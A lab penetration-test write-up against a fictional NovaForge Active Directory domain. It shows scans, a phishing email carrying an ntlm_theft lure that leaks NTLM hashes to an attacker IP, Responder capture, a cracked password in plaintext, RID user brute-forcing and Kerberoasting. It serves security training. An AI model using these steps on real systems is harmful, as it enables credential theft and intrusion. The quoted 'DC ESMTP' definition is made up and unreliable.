
# Objective and scope
NovaForge delivers enterprise software, intelligent automation, and internal management platforms targeted towards mid-sized companies. They have hired Hack Smarter to perform an internal network penetration test, with a special focus on Active Directory.

Your task is to enumerate the network and see if you can fully compromise the domain.

The client has provided you with VPN access to their network, but no credentials.

# Host file setup
```python
sudo nxc smb 10.0.0.100 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## DC
### Open ports
```python
nmap -p- --min-rate=2000 -sT dc.novaforge.local                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:26 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.094s latency).
rDNS record for 10.0.0.100: DC.novaforge.local
Not shown: 65504 closed tcp ports (conn-refused)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49693/tcp open  unknown
49697/tcp open  unknown
49709/tcp open  unknown
49714/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.62 seconds
```

### Nmap
```python
nmap -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT dc.novaforge.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:28 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.095s latency).
rDNS record for 10.0.0.100: DC.novaforge.local

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: NovaForge | Dark Enterprise Suite \xE2\x80\x94 Video Loop
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-06 15:28:25Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 IMAP4 CAPABILITY NAMESPACE IDLE OK CHILDREN completed RIGHTS=texkA0001 ACL QUOTA SORT
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: DC.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:28:46+00:00
| ssl-cert: Subject: commonName=DC.novaforge.local
| Not valid before: 2026-06-18T23:09:56
|_Not valid after:  2026-12-18T23:09:56
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74A81E%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 11 24H2 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (94%), Microsoft Windows Server 2016 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Some interesting services running!

## Storage server
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.0.101 -Pn                                                                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:35 +0100
Nmap scan report for 10.0.0.101
Host is up (0.094s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 66.23 seconds
```

### Nmap
```python
nmap -p 135,445,3389,5985 -A --min-rate=2000 -sT 10.0.0.101 -Pn         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:38 +0100
Nmap scan report for 10.0.0.101
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=STORAGE.novaforge.local
| Not valid before: 2026-06-18T14:30:14
|_Not valid after:  2026-12-18T14:30:14
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: STORAGE
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: STORAGE.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:39:10+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74AA90%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I cant do anything with SMB on the storage server, null auth is disabled since this isnt a DC and also the guest account is disabled!

# Domain Controller

So since im sure at this point the initial access is via the DC ill start here.

## SMB (445)
On the DC, null auth is enabled as with all DCs but cannot use it to enumerate shares or users

The guest account is also disabled!

## SMTP (25)

https://medium.com/@rajkumarkumawat/%EF%B8%8Fsmtp-enumeration-the-ethical-hackers-guide-to-uncovering-email-vulnerabilities-efc85ae0a563

```python
nc -vn 10.0.0.100 25        
(UNKNOWN) [10.0.0.100] 25 (smtp) open
220 DC ESMTP
```

> DC ESMTP (Data Center Extended Simple Mail Transfer Protocol) is a specialized mail transfer protocol configuration optimized for high-volume, high-throughput email delivery within and between data center environments. It builds upon standard ESMTP extensions to handle massive email traffic efficiently while ensuring security and reliability.

I cannot use `VRFY` to validate usernames

## HTTP (80)
There is no links on the main page of the website

No hidden endpoints!

Nuclei didnt find anything!

### Ffuf for vhosts
```python
ffuf -u http://novaforge.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.novaforge.local' -ic -c -t 30 -fs 29073

intranet                [Status: 200, Size: 34525, Words: 6056, Lines: 792, Duration: 103ms]
jobs                    [Status: 200, Size: 34058, Words: 4399, Lines: 355, Duration: 100ms]
```

Found two subdomains!

# `intranet` subdomain

![](Pasted%20image%2020260806172914.png)

![](Pasted%20image%2020260806172934.png)

![](Pasted%20image%2020260806172955.png)

Found some users and also an alert for phishing emails via .xml files

![](Pasted%20image%2020260806173340.png)

![](Pasted%20image%2020260806173507.png)

# `jobs` subdomain

![](Pasted%20image%2020260806173035.png)

Found a user `john.doe`

Its also safe to assume that the employee emily zhou found on the other subdomain is `emily.zhou` based on this info on `john.doe`

![](Pasted%20image%2020260806173146.png)

Also gives me a hint on what files are allowed

Based on the landing screen for this subdomain my next step is to try and phish the `john.doe` user with an xml file!

# User compromise via phishing

```python
python3 ntlm_theft.py -g all -s 192.168.211.2 -f resume
/home/kali/hsm/novaforge/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: resume/resume.scf (BROWSE TO FOLDER)
Created: resume/resume-(url).url (BROWSE TO FOLDER)
Created: resume/resume-(icon).url (BROWSE TO FOLDER)
Created: resume/resume.lnk (BROWSE TO FOLDER)
Created: resume/resume.rtf (OPEN)
Created: resume/resume-(stylesheet).xml (OPEN)
Created: resume/resume-(fulldocx).xml (OPEN)
Created: resume/resume.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(includepicture).docx (OPEN)
Created: resume/resume-(remotetemplate).docx (OPEN)
Created: resume/resume-(frameset).docx (OPEN)
Created: resume/resume-(externalcell).xlsx (OPEN)
Created: resume/resume.wax (OPEN)
Created: resume/resume.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: resume/resume.asx (OPEN)
Created: resume/resume.jnlp (OPEN)
Created: resume/resume.application (DOWNLOAD AND OPEN)
Created: resume/resume.pdf (OPEN AND ALLOW)
Created: resume/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: resume/resume.library-ms (BROWSE TO FOLDER)
Created: resume/Autorun.inf (BROWSE TO FOLDER)
Created: resume/desktop.ini (BROWSE TO FOLDER)
Created: resume/resume.theme (THEME TO INSTALL
Generation Complete.
```

Ill use ntlm theft to generate the xml file

```python
sudo responer -I tun0
```

Then start responder

```python
sendEmail -f attacker@kali.com -t john.doe@novaforge.local -u 'Job Application' -m 'Here is my resume' -a 'resume-(stylesheet).xml' -s dc.novaforge.local:25
Aug 06 17:50:09 kali sendEmail[34425]: Email was sent successfully!
```

Then ill send the email

```python
[SMB] NTLMv2-SSP Client   : 10.0.0.100
[SMB] NTLMv2-SSP Username : NOVAFORGE\john.doe
[SMB] NTLMv2-SSP Hash     : john.doe::NOVAFORGE:fec2858bc2db6aec:E88119BEDF0BD2659D55A94768AC1FBB:01010000000000008058C0B0CA25DD010B53588D79BC6F89000000000200080053004C004900530001001E00570049004E002D004A005000460034004500560048003500420043004F0004003400570049004E002D004A005000460034004500560048003500420043004F002E0053004C00490053002E004C004F00430041004C000300140053004C00490053002E004C004F00430041004C000500140053004C00490053002E004C004F00430041004C00070008008058C0B0CA25DD01060004000200000008005000500000000000000001000000002000009FB85AC8C5991EC9CA1487B38BE69F818483FF43A7C21745922ACCC72FE1E28DF4509DC7352CBD6841F45895828D349CAE3610F2294F8CFAD5FD5A6AFDA1AF9F0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

Now i have his hash!

```python
hashcat johndoe.hash /usr/share/wordlists/rockyou.txt

JOHN.DOE::NOVAFORGE:fec2858bc2db6aec:e88119bedf0bd2659d55a94768ac1fbb:01010000000000008058c0b0ca25dd010b53588d79bc6f89000000000200080053004c004900530001001e00570049004e002d004a005000460034004500560048003500420043004f0004003400570049004e002d004a005000460034004500560048003500420043004f002e0053004c00490053002e004c004f00430041004c000300140053004c00490053002e004c004f00430041004c000500140053004c00490053002e004c004f00430041004c00070008008058c0b0ca25dd01060004000200000008005000500000000000000001000000002000009fb85ac8c5991ec9ca1487b38be69f818483ff43a7c21745922accc72fe1e28df4509dc7352cbd6841f45895828d349cae3610f2294f8cfad5fd5a6afda1af9f0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003200310031002e0032000000000000000000:johndoe1369
```

The hash cracked

```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5                           
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369
```

This user is now compromised!

# Enumeration as `john.doe`

## SMB shares
```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --shares
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369 
SMB         10.0.0.100      445    DC               [*] Enumerated shares
SMB         10.0.0.100      445    DC               Share           Permissions     Remark
SMB         10.0.0.100      445    DC               -----           -----------     ------
SMB         10.0.0.100      445    DC               ADMIN$                          Remote Admin
SMB         10.0.0.100      445    DC               C$                              Default share
SMB         10.0.0.100      445    DC               IPC$            READ            Remote IPC
SMB         10.0.0.100      445    DC               NETLOGON        READ            Logon server share 
SMB         10.0.0.100      445    DC               SYSVOL          READ            Logon server share
```

Default access on the shares

## Dumping users
```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
john.mitchell
david.parker
ryan.collins
michael.turner
jessica.morgan
emily.carter
daniel.brooks
alex.hughes
frank.white
svc_it_admin
david.cokx
john.doe
steve.wills
chuck.harrys
inbox
steve.miller
ethan.wright
olivia.bennett
noah.sanders
liam.harrison
STORAGE$
```

Ive dumped them all to a user file!

This user does not have access to WINRM or RDP on the DC

## BloodyAD get writable
```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u 'john.doe' -p 'johndoe1369' get writable

distinguishedName: CN=Users,DC=novaforge,DC=local
permission: CREATE_CHILD

distinguishedName: CN=Deleted Objects,DC=novaforge,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=john.doe,CN=Users,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=m.lee\0ADEL:93ec6349-1919-424f-963c-5971a8832f62,CN=Deleted Objects,DC=novaforge,DC=local
permission: WRITE

distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
permission: CREATE_CHILD
```

Looks like this user has WriteOwner on the Deleted objects, something to keep in mind!

# Kerberoasting

```python
nxc ldap dc.novaforge.local -u john.doe -p 'johndoe1369' --kerberoasting kerb.hash                                                                               
LDAP        10.0.0.100      389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:novaforge.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.0.100      389    DC               [+] novaforge.local\john.doe:johndoe1369 
LDAP        10.0.0.100      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.0.100      389    DC               [*] Total of records returned 1
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: svc_it_admin, memberOf: CN=Protected Users,CN=Users,DC=novaforge,DC=local, pwdLastSet: 2026-06-20 00:17:08.000373, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$18$svc_it_admin$NOVAFORGE.LOCAL$*novaforge.local\svc_it_admin*$3a171d93b44b7bc7546249c9$001e093c69fc068e92ce4ac74443d34f9cd35617acd64ae6b808278951cf645c1ddc3ca2f66cef7bc7d1d6a8199e1a315c33e7deb46a5a435d01b64b5f0e767879acf33a7209deaccebdfde23141a0dd8679f03b598d350581fd33879a7998f6e207f2a1e63c6ae48ff983dfee5c6606672cba22b277a8153743110f8d4389909d4b31564d26054a7cecc4788b6cb31f2119d75cf974bec17b3e90ba1bbc95470c83fb3f3596f79cf7afcfcc9624cfc7cf291c418d4eaa28561cb4e6f68261eb2f0a810fb890420d7f021262e6826d7102d52d651e00a7686109dba8c85d1d698ce796189753748690fee75544a6120501bf353f450dfd773707fdea90ba5ccb2b15e012844a006b7f8ea83b56e46e3adaa73adefc73e050b73a1873ccf0a36f88555cd76c1f91ad9f560a756dccb0663d687911c1d49f584653e74456b7ce4fbd80f23465a6dcc34f829a76d149f0b8ef2bcea29de246cb795a3f26b27aa9ca48ed030af38dc9f2fa6b3e5a5d331224fc76da8dad4391615406810a65fa3a20586e0e3cb89ad0492d76cfa77ea0304682832e7f012e31acd32e8813b59d51fb97375976308a3331c8625dbee2b6fd8637793f60935bb9c348679eeb26700c857851c61c7ff3edb5cca41456b5afafc02b578a2414e14ddd47425d0ff3cc6cf81ae728292039c13df255b25db7689035871172bc1f43e017ed2c9028304f4080d8bcb57e3680da34f586640230bbdbd443206c819c60a1d6ae125ff07b71378a95b79a6bfc98451346dee4802b51d9e61e6d4dd5e096a08cbdb390cda747a084ce14e2b8be4ceaf4ba7e64e8edba5eed45766976e01c80f57a286c919f2294088115c69b188930027f741b3fe3abd60e4b7593e84137ffc0b3af25632d0940c15e39e0f75add5e0855e692d6cb954ab9e9eb2e7db5906626a78c6c61a20822be8cc42962a8931615ebb1735d8d4babc0b1f6cbc8eef5d63ea03ef86e556b5f618250d54e2731dfb90db36d9ae088d555a6a37d550afd22ba7f8509f5ae77c56f5244d629290d74aa40555bb9e022dd5d553f3b0c60f6be07a7fcdbd25456421f846071c41d6db0df9cd77d4180b92b957d55fce651f39c2916b6baa69442da1ab9733179afdb6d6606de3ae4096036e36e8ce9102ae7c00a35121a4f466001df19d8b8fe83eb7c999ea2c46550505e4a544ec41d8290de95ef2501c463927999e6de06883b36a9fd98b8ff9f5d255338424a085297605523a1d42c1b05c76250fad5672db452b90b72769f752a35562ca58dfb26fdf2252cb9db4c638c37eec9769b7ebf1fab18b85731af1337c5b344f2ecdc6db64413fe5071948aaaf95b2ea772c744c2e5065e346c7fa3d56f9899e9ae7239cc640ab3ccf09a19cae6408eed67ab9bc1a640e19ac380099df544e65144ab4ca3cd9eba0a3beabf25cdb86a6ea046b1cd004c0b506deaa01ab92f996c7f8369afeec7f6607f26b1e3d3eda525f9193b6209479f
```

This users hash cannot be cracked however

# Access on `storage.novaforge.local`

```python
nxc smb storage.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --shares
SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\john.doe:johndoe1369 
SMB         10.0.0.101      445    STORAGE          [*] Enumerated shares
SMB         10.0.0.101      445    STORAGE          Share           Permissions     Remark
SMB         10.0.0.101      445    STORAGE          -----           -----------     ------
SMB         10.0.0.101      445    STORAGE          ADMIN$                          Remote Admin
SMB         10.0.0.101      445    STORAGE          C$                              Default share
SMB         10.0.0.101      445    STORAGE          IPC$            READ            Remote IPC
SMB         10.0.0.101      445    STORAGE          Shared          READ
```

I have read access on the `Shared` share

```python
impacket-smbclient novaforge.local/john.doe:'johndoe1369'@storage.novaforge.local
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
Shared                    DISK            
# use Shared
# ls
drw-rw-rw-          0  Sat Jun 20 16:30:40 2026 .
drw-rw-rw-          0  Sat Jun 20 01:14:08 2026 ..
-rw-rw-rw-    3205143  Sat Jun 20 16:30:40 2026 NovaForge Browser Security Policy.pdf
-rw-rw-rw-     415889  Fri Jun 19 15:35:23 2026 StorageAccessOverview.pdf
# mget *
[*] Downloading NovaForge Browser Security Policy.pdf
[*] Downloading StorageAccessOverview.pdf
# 
```

Found two .pdf files

![670](Pasted%20image%2020260806180840.png)

Looks like there is an internal web service!

![462](Pasted%20image%2020260806181058.png)

So ive found some user role info and also info on an internal service, also some info about the staff only using opera gx browser, so might be able to dump credentials from it!

I think the next step is to collect bloodhound data!

# Bloodhound

There is nothing in bloodhound of interest with the user `john.doe`

